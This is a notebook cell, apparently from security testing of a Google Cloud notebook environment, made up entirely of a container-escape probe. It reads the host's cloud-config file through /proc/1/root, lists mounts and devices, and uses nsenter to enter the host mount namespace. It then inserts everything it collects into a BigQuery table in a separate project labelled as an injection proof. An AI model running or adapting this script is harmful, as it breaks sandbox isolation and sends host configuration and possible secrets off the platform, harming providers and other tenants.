In [ ]:
import os, subprocess
from google.cloud import bigquery
p = []
def safe(label, fn):
    try: p.append({'label':label, 'value': str(fn())[:4000]})
    except Exception as e: p.append({'label':label, 'value': f'ERR: {type(e).__name__}: {str(e)[:400]}'})

# Minimal high-EV tests only
safe('try_cloudcfg', lambda: open('/mnt/stateful_partition/workbench/cloud-config.yaml').read()[:3500])
safe('try_proc1_cloudcfg', lambda: open('/proc/1/root/mnt/stateful_partition/workbench/cloud-config.yaml').read()[:3500])
safe('proc1_root_link', lambda: os.readlink('/proc/1/root'))
safe('proc1_mountinfo', lambda: open('/proc/1/mountinfo').read()[:3000])
safe('proc_self_mountinfo', lambda: open('/proc/self/mountinfo').read()[:3000])
safe('ls_mnt', lambda: subprocess.check_output(['ls','-la','/mnt'], stderr=subprocess.STDOUT, timeout=3).decode())
safe('ls_proc1_mnt', lambda: subprocess.check_output(['ls','-la','/proc/1/root/mnt'], stderr=subprocess.STDOUT, timeout=3).decode()[:1500])
safe('ls_proc1_mnt_stateful', lambda: subprocess.check_output(['ls','-la','/proc/1/root/mnt/stateful_partition'], stderr=subprocess.STDOUT, timeout=3).decode()[:1500])
safe('ls_dev', lambda: subprocess.check_output(['ls','/dev'], stderr=subprocess.STDOUT, timeout=3).decode()[:2000])
safe('lsblk', lambda: subprocess.check_output(['lsblk'], stderr=subprocess.STDOUT, timeout=3).decode()[:1500])
safe('nsenter_mnt', lambda: subprocess.check_output(['nsenter','-t','1','-m','--','cat','/mnt/stateful_partition/workbench/cloud-config.yaml'], stderr=subprocess.STDOUT, timeout=5).decode()[:3500])

client = bigquery.Client(project='bq-ssrf-453453')
table_id = 'bq-ssrf-453453.injected_proof.NBEX_HOST_ESCAPE'
schema = [bigquery.SchemaField('label','STRING'), bigquery.SchemaField('value','STRING')]
client.create_table(bigquery.Table(table_id, schema=schema), exists_ok=True)
errs = client.insert_rows_json(table_id, p)
print('rows', len(p), 'errors', errs)
